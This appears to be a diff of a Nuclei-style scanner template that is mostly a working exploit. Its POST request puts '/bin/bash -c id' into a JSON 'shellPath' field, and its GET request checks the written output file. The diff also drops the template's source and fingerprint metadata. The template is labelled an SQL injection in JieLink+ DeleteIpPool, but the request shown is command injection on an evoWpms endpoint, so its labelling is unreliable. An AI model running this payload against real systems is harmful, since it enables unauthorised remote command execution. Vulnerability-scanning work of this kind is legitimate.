@@ -3,24 +3,18 @@ info:
   name: JieLink+智能终端操作平台DeleteIpPool存在SQL注入漏洞.docx
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/byqg7m4kurqbhsxn'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: byqg7m4kurqbhsxn
-    fofa: body="static/qwebchannel.js" && body="/*客户端会小于800*/"
 http:
 - raw:
-  - "POST /evo-runs/v1.0/push HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36\nAccept-Encoding: gzip\nContent-Type: application/json\nX-Subject-Headerflag: ADAPT\nContent-Length: 243\n\n{\n  \"method\": \"agent.ossm.mapping.config\",\n  \"info\": {\n    \"configure\": \"abcd\",\n    \"filePath\": \"haha\",\n    \"paramMap\": {\n      \"shellPath\": \"/bin/bash -c id>/opt/evoWpms/static/2.txt\",\n      \"filePath\": \"abc\"\n    },\n    \"requestIp\": \"\"\n  }\n}\n![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1752856711514-c2f31a38-6136-4685-9433-3486bae2a3ff.png)"
+  - "POST /evo-runs/v1.0/push HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36\nAccept-Encoding: gzip\nContent-Type: application/json\nX-Subject-Headerflag: ADAPT\nContent-Length: 243\n\n{\n  \"method\": \"agent.ossm.mapping.config\",\n  \"info\": {\n    \"configure\": \"abcd\",\n    \"filePath\": \"haha\",\n    \"paramMap\": {\n      \"shellPath\": \"/bin/bash -c id>/opt/evoWpms/static/2.txt\",\n      \"filePath\": \"abc\"\n    },\n    \"requestIp\": \"\"\n  }\n}"
   redirects: false
   matchers:
   - status:
     - 200
     type: status
 - raw:
-  - 'GET /static/2.txt HTTP/1.1
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1752856711703-e0bd3811-ab84-42ee-8f0c-b4f208f86aea.png)'
+  - GET /static/2.txt HTTP/1.1
   redirects: false
   matchers:
   - status:
